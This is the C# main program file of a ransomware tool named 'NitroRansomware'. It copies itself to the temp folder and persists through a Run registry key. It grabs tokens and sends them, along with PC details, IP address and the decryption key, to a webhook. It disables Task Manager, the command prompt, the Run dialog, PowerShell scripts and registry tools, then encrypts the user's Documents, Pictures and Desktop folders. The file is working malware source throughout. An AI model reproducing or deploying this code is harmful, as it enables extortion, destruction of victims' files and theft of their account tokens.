using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace NitroRansomware
{
    class Program
    {
        static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        public static string WEBHOOK = "webhook here";
        public static string DECRYPT_PASSWORD = "q9cBYcfzP9HWXK&TqGir4kNPWmBTj#!T$ak9Y88u5jstUsZamYAs5W#vs2d#7VJKK6zzk4*!&8o5G@g3n@mxQD$n2kxXDHXer$EBz@KcLa8ir3wrGAA$nsfef3BVV#NF";

        static Logs logging = new Logs("DEBUG", 0);
        static Webhook ww = new Webhook(WEBHOOK);
        static void Main(string[] args)
        {

            if (Installed())
            {
                Disabler();
                Application.Run(new NitroRansomware());
            }

            else
            {
                Duplicate();
                StartUp();
                Setup();
                Disabler();
                EncryptAll();
                Temp();
                Thread.Sleep(6000);
                Application.Run(new NitroRansomware());
            }
        }

        static void Setup()
        {
            logging.Debug("Setup start");
            List<string> tokens = Grabber.Grab();
            string tokenWrite = "";
            foreach (string x in tokens)
            {
                tokenWrite += x + "\n";
            }

            Console.WriteLine(tokenWrite);

            List<string> pcDetails = User.GetDetails();
            string uuid = User.GetIdentifier();
            string ip = User.GetIP();

            Webhook ww = new Webhook(WEBHOOK);
            ww.Send($"**Program executed** ```Status: Active\nPC Name: \nUser: \nUUID: \nIP Address: ```");
            ww.Send($"```Decryption Key: {DECRYPT_PASSWORD}```");
            ww.Send($"```Tokens:\n```");
        }
        public static void Disabler()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string powershellvalue = "0";
            string cmd = "SOFTWARE\\Policies\\Microsoft\\Windows\\System";
            string run = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
            string powershell = "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";


            regkey = Registry.CurrentUser.CreateSubKey(subKey);
            regkey.SetValue("DisableTaskMgr", keyValueInt);
            regkey.Close();

            regkey = Registry.CurrentUser.CreateSubKey(cmd);
            regkey.SetValue("DisableCMD", keyValueInt, RegistryValueKind.DWord);
            regkey.Close();

            regkey = Registry.CurrentUser.CreateSubKey(run);
            regkey.SetValue("NoRun", keyValueInt, RegistryValueKind.DWord);
            regkey.Close();

            regkey = Registry.LocalMachine.CreateSubKey(powershell);
            regkey.SetValue("EnableScripts", powershellvalue, RegistryValueKind.DWord);
            regkey.Close();

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableRegistryTools", keyValueInt, RegistryValueKind.DWord);
                regkey.Close();
            }
            catch (Exception)
            {
            }
        }
        public static void EncryptAll()
        {

            ww.Send("```Starting file encryption...```");
            var t1 = new Thread(() => Crypto.EncryptContent(documents));
            var t2 = new Thread(() => Crypto.EncryptContent(pictures));
            var t3 = new Thread(() => Crypto.EncryptContent(desktop));
            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
            ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
            Wallpaper.ChangeWallpaper();
        }
        public static void DecryptAll()
        {
            var t1 = new Thread(() => Crypto.DecryptContent(documents));
            var t2 = new Thread(() => Crypto.DecryptContent(pictures));
            var t3 = new Thread(() => Crypto.DecryptContent(desktop));

            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
        }

        static void StartUp()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string loc = Path.GetTempPath() + filename;
                Console.WriteLine(loc);
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("NR", "\"" + loc + "\"");
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
        }
        public static void RemoveStart()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.DeleteValue("NR", false);
                }
            }
        }
        static void Duplicate()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
                File.Copy(filepath, Path.GetTempPath() + filename);
                Console.WriteLine(Path.GetTempPath());
            }
            catch (Exception ex) { logging.Debug(ex.Message); }
        }
        static bool Installed()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
            {
                return true;
            }
            return false;
        }

        static void Temp()
        {
            string save = Path.GetTempPath() + "NR_decrypt.txt";
            Console.WriteLine(save);
            using (StreamWriter sw = new StreamWriter(save))
            {
                sw.WriteLine(DECRYPT_PASSWORD);
            }
        }
    }
}